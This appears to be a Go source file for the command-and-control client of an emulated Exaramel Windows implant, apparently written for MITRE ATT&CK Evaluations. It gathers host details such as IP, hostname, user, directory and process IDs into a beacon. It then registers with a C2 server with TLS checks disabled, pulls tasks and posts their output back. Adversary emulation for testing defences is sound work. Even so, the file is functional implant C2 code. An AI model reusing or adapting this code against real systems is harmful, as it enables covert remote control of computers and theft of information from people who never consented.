package c2

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"io/ioutil"
	"net"
	"net/http"
	"os"

	"attackevals.mitre-engenuity.org/exaramel-windows/discovery"
)

// Beacon shows how to construct a well formed beacon
type Beacon struct {
	GUID     string `json:"guid"`
	IPAddr   string `json:"ipAddr,omitempty"`
	HostName string `json:"hostName,omitempty"`
	User     string `json:"user,omitempty"`
	Dir      string `json:"dir,omitempty"`
	PID      int    `json:"pid,omitempty"`
	PPID     int    `json:"ppid,omitempty"`
	Task     string `json:"tasks,omitempty"`
}

var ExaramelWindowsBeacon Beacon

// Get preferred outbound ip of this machine
func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return err.Error()
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.String()
}

// CreateBeacon initializes the Exaramel Windows beacon values
func CreateBeacon() {

	// We use a static GUID for ATT&CK Evaluations purposes
	ExaramelWindowsBeacon.GUID = "Exaramel-Windows"
	ExaramelWindowsBeacon.IPAddr = GetOutboundIP()
	ExaramelWindowsBeacon.HostName, _ = os.Hostname()
	ExaramelWindowsBeacon.User, _ = discovery.GetCurrentUserName()
	ExaramelWindowsBeacon.Dir, _ = os.Getwd()
	ExaramelWindowsBeacon.PID = os.Getpid()
	ExaramelWindowsBeacon.PPID = os.Getppid()
}

// RegisterImplant is used to register Exaramel-Windows to the C2 server
func RegisterImplant(registerURL string) (string, error) {

	registerURL = registerURL + "/register"
	// convert ExaramelWindowsBeacon data into JSON
	beaconJSON, err := json.Marshal(ExaramelWindowsBeacon)
	if err != nil {
		return "", err
	}

	// setup HTTP POST request
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	req, err := http.NewRequest("POST", registerURL, bytes.NewBuffer(beaconJSON))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// execute HTTP POST request and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}

func GetTask(getTaskURL string) (string, error) {

	url := getTaskURL + "/task/" + ExaramelWindowsBeacon.GUID
	response, err := http.Get(url)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()
	t, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	task := string(t)
	return task, err
}

func PostTaskOutput(postOutputURL string, taskOutput []byte) (string, error) {

	url := postOutputURL + "/output/" + ExaramelWindowsBeacon.GUID

	// setup HTTP POST request
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(taskOutput))
	if err != nil {
		return "", err
	}

	// execute HTTP POST and read response
	client := &http.Client{}
	response, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer response.Body.Close()

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return "", err
	}
	return string(body), err
}
